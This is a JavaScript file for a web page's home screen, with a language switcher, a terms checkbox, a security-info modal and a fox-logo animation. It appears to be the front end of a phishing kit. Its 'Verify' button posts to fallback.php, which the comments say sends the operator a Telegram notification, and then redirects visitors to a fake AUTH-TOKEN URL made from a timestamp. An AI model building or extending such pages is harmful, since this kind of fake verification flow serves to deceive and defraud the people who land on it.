// Home Page Specific JavaScript
document.addEventListener('DOMContentLoaded', () => {
    // Initialize internationalization
    const i18nSystem = new I18nSystem();
    i18nSystem.init();
    
    // Set initial HTML lang attribute
    const initialLang = document.getElementById('langs').value;
    document.documentElement.lang = initialLang;
    
    // Update HTML lang attribute when language changes
    document.getElementById('langs').addEventListener('change', () => {
        const selectedLang = document.getElementById('langs').value;
        document.documentElement.lang = selectedLang;
    });
    
    // Terms checkbox functionality
    document.getElementById('termsCheckbox').addEventListener('change', function() {
        const verifyBtn = document.getElementById('verifyBtn');
        verifyBtn.disabled = !this.checked;
        verifyBtn.classList.toggle('active', this.checked);
    });

    // Verify button functionality
    document.getElementById('verifyBtn').addEventListener('click', async function() {
        if (!document.getElementById('termsCheckbox').checked) return;
        
        const verifyBtn = this;
        const originalText = verifyBtn.innerHTML;
        
        try {
            // Show loading state
            verifyBtn.classList.add('loading');
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '';
            
            // Send minimal verification data to fallback.php
            const formData = new FormData();
            formData.append('verification_request', 'true');
            formData.append('language', i18nSystem.currentLang);
            // Telegram notifications are now active
            
            // Send data to fallback.php which will handle Telegram notification
            const response = await fetch('./fallback.php', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Redirect after Telegram notification is sent
                window.location.href = result.redirect || '?AUTH-TOKEN=' + btoa(Date.now().toString()).replace(/[^a-zA-Z0-9]/g, '').substring(0, 32) + '&cur=loading';
            } else {
                throw new Error(result.message || 'Verification failed');
            }
        } catch (error) {
            // console.error('Error:', error);
            
            // Better error handling
            let errorMessage = 'An error occurred. Please try again.';
            if (error.message) {
                errorMessage = error.message;
            }
            
            // Show error to user
            alert(errorMessage);
            
            // Restore button state
            verifyBtn.classList.remove('loading');
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = originalText;
        }
    });

    // Modal functionality
    const modal = document.getElementById('securityModal');
    document.getElementById('securityInfoBtn').addEventListener('click', () => {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    });
    
    document.querySelector('.close-modal').addEventListener('click', () => {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    });
    
    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });

    // JSField 3D Fox Animation - Load the bundled script
    const script = document.createElement('script');
    script.src = 'assets/js/jsfox.js';
    script.onload = function() {
        // console.log('JSField Fox Animation loaded successfully');
        // Force initial render after a short delay
        setTimeout(() => {
            const logoContainer = document.getElementById('logo-container');
            if (logoContainer && logoContainer.querySelector('svg')) {
                // Trigger a mouse move event to initialize the animation
                const event = new MouseEvent('mousemove', {
                    clientX: window.innerWidth / 2,
                    clientY: window.innerHeight / 2
                });
                window.dispatchEvent(event);
            }
        }, CONFIG.foxAnimationInitDelay || 100);
    };
    script.onerror = function() {
        // console.error('Failed to load JSField Fox Animation');
    };
    document.head.appendChild(script);
}); 